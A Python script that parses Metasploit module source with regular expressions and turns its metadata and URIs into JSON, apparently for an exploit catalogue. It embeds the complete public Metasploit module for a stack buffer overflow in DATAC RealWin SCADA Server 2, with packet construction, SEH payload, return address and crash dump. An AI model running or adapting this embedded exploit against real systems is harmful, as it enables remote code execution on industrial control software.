import re
import json
import os
import time, datetime
from Naked.toolshed.shell import muterun_rb
from url_normalize import url_normalize

def construct_url(uris):
    if uris:
        for i in range(len(uris)):
            print(uris[i])
            if 'bin' in uris[i] or 'cmd' in uris[i]:
                continue
            elif 'path' in uris[i] or 'target' in uris[i] or 'base' in uris[i]:
                continue 
            elif 'datastore' in uris[i].lower():
                word = re.findall('datastore\[(.*)\]', uris[i])
                if word:
                    word = word[0]
                else:
                    continue
                print(word)
                print(register_options)
                if word not in register_options:
                    continue
                to_replace_arr = re.findall("'.*?{}',\s*\[(.*)\]".format(re.escape(word)), register_options)[0]
                to_replace_word = to_replace_arr.replace(' ', '').split(',')
                if len(to_replace_word) > 2:
                    to_replace_word = to_replace_word[2][1:-1]
                else:
                    continue

                URIs.extend([re.sub('datastore\[(.*)\]', to_replace_word, uris[i])])
            elif '#{' not in str(uris[i]):
                if '/' != uris[i]:
                    URIs.extend(['/'+uris[i].lstrip('/')]) 
            elif '#{' in str(uris[i]):
                to_search = re.findall('#{(.*)}', uris[i])
                if to_search:
                    urls = []
                    for i in range(len(to_search)):
                        print(to_search[i])
                        urls.extend(re.findall(to_search[i]+'\s*=\s*[\'"]?(.*?)[\'"]\n', exploit))
                    if urls:
                        URIs.extend(['/'+re.sub('#{(.*)}', url, uris[i]).lstrip('/') for url in urls])

exploit = """
##
# $Id: realwin_on_fc_binfile_a.rb 12975 2011-06-20 04:01:47Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DATAC RealWin SCADA Server 2 On_FC_CONNECT_FCS_a_FILE Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability found in DATAC Control International RealWin
				SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE
				packet via port 910, RealWin will try to create a file (which would be saved to
				C:\Program Files\DATAC\Real Win\RW-version\filename) by first copying the user-
				supplied filename with a inline memcpy routine without proper bounds checking, which
				results a stack-based buffer overflow, allowing arbitrary remote code execution.

				Tested version: 2.0 (Build 6.1.8.10)
			},
			'Author'         => [ 'Luigi Auriemma', 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12975 $',
			'References'     =>
				[
					[ 'URL', 'http://aluigi.altervista.org/adv/realwin_5-adv.txt' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 450,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Universal', { 'Ret' => 0x4002da21 } ], # P/P/R FlexMLang.DLL 8.1.45.19
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Mar 21 2011'))

		register_options([Opt::RPORT(910)], self.class)
	end

	def exploit

		connect

		data =  [0x67542310].pack('V')
		data << [0x00000824].pack('V')
		data << [0x00100001].pack('V')
		data << [0x00000001].pack('V')  #Packet type
		data << [0x00060000].pack('V')
		data << [0x0000ffff].pack('V')
		data << rand_text_alpha_upper(221)
		data << generate_seh_payload(target.ret)
		data << rand_text_alpha_upper(17706 - payload.encoded.length)
		data << [0x451c3500].pack('V')
		data << [0x00000154].pack('V')
		data << [0x00020040].pack('V')

		print_status("Trying target #{target.name}...")
		sock.put(data)
		select(nil,nil,nil,0.5)

		handler
		disconnect

	end

end


=begin
0:022> r
eax=00000819 ebx=0587f89c ecx=00000039 edx=011fba04 esi=011fc138 edi=0587fffd
eip=0042702f esp=0587f738 ebp=011fba04 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
RealWinDemo+0x2702f:
0042702f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:022> !exchain
0587f748: RealWinDemo+e0b78 (004e0b78)
0587f9a4: FlexMLang!GetFlexMLangIResourceBrowser+2b991 (4002da21)
Invalid exception stack at 49a206eb
0:022> u 4002da21
FlexMLang!GetFlexMLangIResourceBrowser+0x2b991:
4002da21 5e              pop     esi
4002da22 5b              pop     ebx
4002da23 c3              ret
=end
"""

nospace = ""
metasploit = re.findall('class Metasploit', exploit)
if not metasploit:
    print('ma ta')
array = re.findall(r"\\?'(.*?)\\?\\?'[^\w]", exploit)
for string in array:
    if '#' in string:
        string_1 = string.replace('#','dash')
        print(string_1)
        exploit = re.sub(re.escape(string), "{}".format(string_1), exploit)
exploit = re.sub('[\s,](#[^{\n]?.*)', '', exploit)
exploit = re.sub('=begin.*?=end', '', exploit, flags=re.DOTALL)
# value = re.findall('(\S\s*)=(?:end|begin)\s*(.*)',  exploit)
# if value:
#     value, after = value[0]
#     if value[0] == ',':
#         exploit = re.sub('(\S\s*)=(?:end|begin)', '\g<1>',exploit)
#     else:
#         exploit = re.sub('(\S\s*)=(?:end|begin)', '\g<1>,',exploit)
#     if after[0] != '[':
#         exploit = re.sub(re.escape(after), '', exploit)
lista = re.findall(r'\bdef initialize(?:\(\s*i|\s*super)(.*?)(?:\bregister_options\b|\bend\b)\s*def', exploit, re.DOTALL)[0]
nospace = lista + 'end of the body'
print(nospace)
nospace1 = re.findall("({?\s*'Name'.*?),?\s*\)\s*\)?\s*(?:(?:opt.*)?(?:de)?register_(?:advanced_)?options|end of the body)", nospace, re.M | re.S)
if nospace1:
    nospace = nospace1[0]
title = re.findall("'Name'\s*=>\s*['\"](.*?[\s]*.*?)['\"],", nospace)[0]
print(nospace)
nospace = re.sub('=>', ':', nospace)
nospace = re.sub('\n', ' ', nospace)
nospace = re.sub('\s+', ' ', nospace)
if '{' not in nospace[:4]:
    nospace = '{' + nospace + '}'
desc = re.findall('(%q[{\(\[]|%[\({\[])(.*?)(}|\))\s*,\s*\'', nospace)
if not desc:
    desc = re.findall("'Description'\s*:\s*'(.*?)',", nospace, re.DOTALL)[0]
else:
    _, desc, _ = desc[0]
print(nospace)
platform = re.findall('(%w{|%w\(|%w\[)(.*?)(}|\)|\]),?', nospace)
nospace = re.sub("('BadChars' : ).*?(,|})\s", "\g<1>''\g<2> ", nospace)
nospace = re.sub('0x0*[1-9a-fA-F][0-9a-fA-F]*','0', nospace)
nospace = re.sub("'EncoderType' : (.*?)(,|}|\])", "'EncoderType' : '\g<1>'\g<2>", nospace)
nospace = re.sub("\]\s*\[", "], [", nospace)
authors = re.findall("'Authors?' : \[\s*(.*?)\],? '", nospace)
if not authors:
    authors = re.findall("'Authors?' : \[?\s*(.*?)\]?,? '", nospace)
if authors:
    authors = re.split(", (?=(?:[^\"']*[\"'][^\"']*[\"'])*[^\"']*$)", authors[0])
    for author in authors:
        if not author.startswith(('"',"'")) and not author.endswith(('"','"')):
            nospace = re.sub(re.escape(author), "", nospace)
        else:
            author_rep = author[1:-1].replace('"', '')
            nospace = re.sub(re.escape(author[1:-1]), author_rep, nospace)
desc = '"' + desc.replace('"', "'") + '"'
title = title.replace('"', "'")
nospace = re.sub('\'', '"', nospace)
to_json = nospace
nospace = re.sub('(.*?)" "(.*)', '\g<1>", "\g<2>', nospace)
nospace = re.sub('(,)\s*,', ' \g<1>', nospace)
nospace = re.sub('(,)\s*([}\]\)])', ' \g<2>', nospace)
nospace = re.sub('(\[|{)\s*,', ' \g<1>', nospace)
print(nospace)
nospace = re.sub('("BrowserRequirements" : )({.*})\s*([},\]])(?=\s*["{\[]+|$)', '\g<1>""\g<3>', nospace)
nospace = re.sub('"Stance" : (.*?)(,|})', '"Stance" : "\g<1>"\g<2>', nospace)
nospace = re.sub('(\s*?{\s*?|\s*?,\s*?)(["])?([a-zA-Z0-9]+)(["])?:\s+([^\/\[]+?)', '\g<1>"\g<3>" : \g<5>', nospace)
nospace = re.sub('(%q[{\(\[]|%[\({\[])(.*?)(}|\))\s*,\s*"', '{}, "'.format(desc.replace('::', ':~:')) ,nospace)
nospace = re.sub('("PrependEncoder" :\s+)([^"\(]\S*[^"},]|\(.*\))', '\g<1>""', nospace)
nospace = re.sub('([{:])\s+(:\w+)', '\g<1> "\g<2>"', nospace)
nospace = re.sub('"Name"\s*:\s*"(.*?)", "', '"Name" : "'+title.replace('\n', ' ') + '", "', nospace)
if platform:
    _,platform,_ = platform[0]
nospace = re.sub('(%w{|%w\(|%w\[)(.*?)(}|\)|\]),?', '"{}",'.format(platform) ,nospace)
nospace = re.sub('("Space" : )[^"][0-9_,+A-Za-z\*\.\)\(\s-]*', '\g<1> 1024, ', nospace)
nospace = re.sub('"(?:Shellcode|Prepend)" : (?:.*(?:\.[\s\n\r]*[\w]+)[\s\n\r]*(?:\(.*?\))|"?.*?"\s([,}])|"?.*?"\s*?)', '\g<1>', nospace)

nospace = re.sub('(,)\s*,', ' \g<1>', nospace)
nospace = re.sub('(,)\s*([}\]\)])', ' \g<2>', nospace)
nospace = re.sub('(\[|{)\s*,', ' \g<1>', nospace)
nospace = re.sub('(\w*_LICENSE|ARCH_\w*)(\s*\]*?)', '"\g<1>"', nospace)
nospace = re.sub('(:\s+\[)([A-Z_]+[^a-z0-9-"\]}{\[]+)(\])', '\g<1>"\g<2>"\g<3>', nospace)
nospace = re.sub('"Signature" : \/.*?\/.*?,', '', nospace)
arithmetics = re.findall('(\d+)(\*|\+)(\d+)', nospace)
if arithmetics:
    for operation in arithmetics:
        a, sign, b = operation
        if sign == '+':
            result = int(a) + int(b)
        elif sign == '*':
            result = int(a) * int(b)
        nospace = re.sub(re.escape('{}{}{}'.format(a, sign, b)), str(result), nospace)
hex_values = re.findall(r'(?:\\x[0-9a-fA-F]+)+', nospace)
for group in hex_values:
    nospace = re.sub(re.escape(group), "Some string", nospace)
nospace = re.sub(': nil', ': null', nospace)
targets = re.findall('("Targets" : \[\s*\[?.*\s*\]\s*\])', nospace)
if targets:

    to_edit = re.findall('\[\s*\[?\s*(.*?\s*})\s*\]\s*\]?', targets[0])
    if not to_edit:
        to_edit = re.findall('\[\s*\[?\s*(.*?\s*\])\s*\]?\s*\]?', targets[0])
    for i, match in enumerate(to_edit):
        if match.endswith(']'):
            if not re.findall('"Arch" : \[', match):
                match = match[:-1]
        check_brackets = re.findall('^".*?"\s*,\s*(.*)', match)[0]
        if not check_brackets.startswith('{'):
            to_insert = '{ ' + check_brackets + ' }'
            match1 = match.replace(check_brackets, to_insert)
            nospace = re.sub(re.escape(match), match1, nospace)     
nospace = re.sub(r'\\"([^,])', "'\g<1>", nospace)
references  = re.findall('"References" : \[\s*(.*?)\s*\], "', nospace)
if references:
    references = references[0]
if references:

    if not references.startswith('['):
        new_array_1 = references.split(', ')
        new_array = []

        for string in new_array_1:
            if re.findall('(".*?")\s*:\s*(".*?")', string):
                new_array.append(string)
            else:
                values = string.strip('"').split(' ')
                new_array.extend('"'+string+'"' for string in values)
        alt_array = []
        alt_array.extend('[ {} ]'.format(arr) for arr in new_array if re.findall('(".*?")\s*:\s*(".*?")', arr))
        non_array = [arr for arr in new_array if not re.findall('(".*?")\s*:\s*(".*?")', arr)]
        if len(non_array) % 2 == 0:
            new_array = ['[ {}, {} ]'.format(non_array[i], non_array[i+1]) for i in range(0, len(non_array), 2)]
            alt_array.extend(new_array)
        references = ', '.join(alt_array)
    references_replaced = re.sub('(\[\s*".*?")\s*:\s*(".*?"\s*\])', '\g<1>, \g<2>', references)
    print(references_replaced)
    nospace = re.sub(re.escape(references), references_replaced, nospace)
nospace = re.sub(':?\s([^"]\w*::.*?[^"])(,)', ': "\g<1>"\g<2>', nospace)
print(nospace)
myfile = json.dumps(nospace.replace('\\','\\\\'))
try:
    jsonf = json.loads(json.loads(myfile))
    title = "NOCVE"
    if 'References' in jsonf:
        for arr in jsonf.get('References'):
            if arr and arr[0] == 'CVE':
                title = arr[0] + '-' + arr[1]
                break

    myDict = {
        title: {}
    }

    arr = ['Name', 'Description', 'Platform', 'References', 'Targets']

    for key in jsonf.keys():
        if key in arr:
            myDict[title][key] = jsonf.get(key)

    myDict[title]['Type'] = 'webapps'

    register_options = re.findall('register_options\((.*?)],?(?:\s*self\.class)?\)?\s*(?:end)', exploit, re.DOTALL)
    if register_options:
        register_options = register_options[0]

    URIs = re.findall('(GET|POST|PATCH|PUT) (.*) HTTP', exploit)
    if URIs:
        URIs = ['/'+URIs[i][1].lstrip('/') for i in range(len(URIs)) if URIs[i][1] != '/'] 

    uris = re.findall('\s*[\'\"](\/[^#].*?)[\'\"]', exploit)
    construct_url(uris)

    normalize = re.findall('normalize_uri\((.*)\)', exploit)
    if normalize:
        urls = {}
        for string in normalize:
            to_search_1 = re.findall('[?!^\'"](.*?)[?!^\'"]', string)
            splitted = string.replace(' ', '').replace("'",'').split(',')
            to_search = [word for word in splitted if word not in to_search_1]
            if to_search:
                for i in range(len(to_search)):
                    if 'uri' in to_search[i] or 'path' in to_search[i] or 'datastore' in to_search[i].lower():
                        continue
                    word = re.findall(re.escape(to_search[i])+'\s*=\s*[\'"]?(.*?)[\'"]\n', exploit)
                    if not word:
                        word = ''
                    else:
                        word = word[0]
                    urls[to_search[i]] = word
        normaliz = []
        for string in normalize:
            for key in urls.keys():
                if key in string:
                    string = string.replace(key, urls[key])
            normaliz.append(string)
        construct_url(['/' + '/'.join(s.strip('/').replace("'", '').replace(',', '').replace('"', '').replace(' ', '') for s in normaliz[i].split(',') if 'uri' not in s and 'nil' not in s) for i in range(len(normaliz))])

    uris = re.findall("'uri'\s*=>\s*[\'\"]\/?#{.*?}(\S*)\?\S*[\'\"]", exploit)
    construct_url(uris)

    myDict[title]['URI'] = list(set(URIs))

    print(json.dumps(myDict))
except ValueError as e:
    print(e)